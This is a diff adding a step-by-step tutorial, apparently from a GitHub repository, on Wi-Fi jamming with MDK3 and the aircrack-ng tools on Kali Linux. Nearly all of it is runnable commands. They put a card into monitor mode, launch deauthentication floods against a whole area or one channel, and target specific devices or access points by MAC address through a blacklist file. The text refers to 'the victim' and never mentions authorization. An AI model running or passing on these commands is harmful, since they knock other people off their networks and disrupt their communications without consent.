@@ -1,0 +1,78 @@
+IN THIS TOTURIAL YOU WILL LEARN HOW TO Use MDK3 for Advanced Wi-Fi Jamming.
+
+YOU CAN USE Kali Linux OS FOR BEST RESULTS.
+
+STEP 1: apt update
+
+STEP 2: apt upgrade
+
+STEP 3: apt install mdk3
+
+STEP 4: mdk3 --help
+
+-w flag for MAC addresses to ignore, or whitelist.
+
+-b flag for MAC addresses to attack, or blacklist.
+
+-s flag for the speed (packets per second) of the attack.
+
+-c flag for the channel to run the attack on.
+
+
+
+## Jam an Area
+
+
+STEP 1: sudo airmon-ng start wlan0
+
+STEP 2: mdk3 wlan0mon d
+
+
+
+## Jam a Channel
+
+
+STEP 1: airodump-ng wlan0mon
+
+STEP 2: mdk3 wlan0mon -c 6  [-c 6 = type the channel number on which the vicitm is to jam it]
+
+
+
+
+## Whitelist & Blacklist Devices
+
+Once we have a specific channel to attack, we can be more precise by adding a blacklist or a whitelist.To do this, we'll re-run our Airmon-ng scan, and this time, we'll copy the MAC address of the device we wish to attack. I have tested doing this for both the address of the AP and the device you want to attack. Using the MAC address of the AP will attack everything on it, whereas adding the MAC address of the device will only attack it and nothing else on the network.
+
+
+STEP 1: airodump-ng wlan0mon -c 6
+
+
+Once we find a MAC address that is associated, we can target it easily. Copy the MAC address, and then open a new terminal window. Type nano black.txt and press Enter to open a text editor window. Now, paste the MAC address of the device you wish to jam and press Ctrl-X to close the text editor.
+
+
+STEP 2: mdk3 wlan0mon d -c 6 -b ~/black.txt
+
+
+
+
+
+
+
+____________________________________________________________________________________________________________________________________________
+▶ Name: StromWise
+
+▶ Role: Creator
+
+▶ Location: Unknown
+
+▶ GitHub: https://github.com/stromwise 
+
+▶ Instagram: https://www.instagram.com/stromwise/ 
+
+▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777
+
+▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 
+
+▶ Twitter: https://twitter.com/StromWise 
+____________________________________________________________________________________________________________________________________________
+
